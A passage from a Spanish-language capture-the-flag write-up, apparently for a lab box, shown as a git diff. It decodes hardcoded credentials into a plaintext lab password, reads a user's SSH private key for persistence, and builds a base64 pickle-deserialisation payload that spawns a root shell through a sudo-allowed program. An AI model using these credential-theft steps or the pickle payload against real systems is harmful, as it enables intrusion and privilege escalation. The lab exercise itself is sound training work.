@@ -191,15 +191,89 @@ if __name__ == "__main__":
 
 Este scripts contiene credneciales codificadas como vemos lo coge de la libreria cryto simplemente vamos a ver si lo generamos pidiendolo y ya
 
+Simplemente deberemos escribir un srcipt con las variables y que simplemente desencripte
 
+```
+from Crypto.Util.number import long_to_bytes
+username = 1684630636
+password = 2457564920124666544827225107428488864802762356L
+user= long_to_bytes(username)
+passwd= long_to_bytes(password)
 
+print (user+”:”+passwd)
+```
 
+![image](https://github.com/user-attachments/assets/300ca375-d2c1-4a1c-9522-cfde31e8d5de)
 
+dill:n3v3r_@_d1ll_m0m3nt
 
+![image](https://github.com/user-attachments/assets/e94829d8-b3e5-4927-aefa-95cd51eaece3)
 
+Estamos dentro podemos ya sacar la user flag
 
+Vemos que realmente no es tán fácil podemos hacer cat a archivos pero no tenemos accesos, lo que vamos a hacer es simplemente podriamos quedar una nueva rev shell o leer la id_rsa de ssh y tener mas persistencia
 
+```
+cat ~/.ssh/id_rsa
+```
 
+Una vez tenemos la id_rsa nos conectamos via ssh
+
+```
+chmod 600 id_rsa
+```
+
+![image](https://github.com/user-attachments/assets/7b6b87d3-2cad-4ada-9c1f-d793b3dcad95)
+
+Aquí dentro ya podemos sacara la primera flag mucho mas tranquilos
+
+# Escala de privilegios
+
+```
+dill@ubuntu-xenial:~$ sudo -l -l
+Matching Defaults entries for dill on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dill may run the following commands on ubuntu-xenial:
+
+Sudoers entry:
+    RunAsUsers: ALL
+    RunAsGroups: ALL
+    Options: !authenticate
+    Commands:
+	/opt/peak_hill_farm/peak_hill_farm
+```
+
+Vamos a ver que hace eso
+
+![image](https://github.com/user-attachments/assets/7b28d6bb-b46d-484f-a232-af53724b98ed)
+
+Podemos hacerlo mucho más simple y meter un linpeas y ver los archivos modificados
+
+![image](https://github.com/user-attachments/assets/64ea6509-4480-4ed3-bff4-d4ec02173c40)
+
+parece ser que vamos a tener que hacer otro script ajaja
+
+```
+import pickle
+import os
+import base64
+class EvilPickle(object):
+def __reduce__(self):
+return (os.system, (‘/bin/bash’, ))
+pickle_data = pickle.dumps(EvilPickle())
+payload = base64.b64encode(pickle_data)
+print (payload)
+```
+
+![image](https://github.com/user-attachments/assets/10480145-b66b-48f5-9032-5f4773af3c90)
+
+![image](https://github.com/user-attachments/assets/10ce0a46-ec04-4e2d-b621-149cf18fce25)
+
+GG!!!!!!!!!!!!!!!!!
+
+HAPPY HACKING
 
 
 
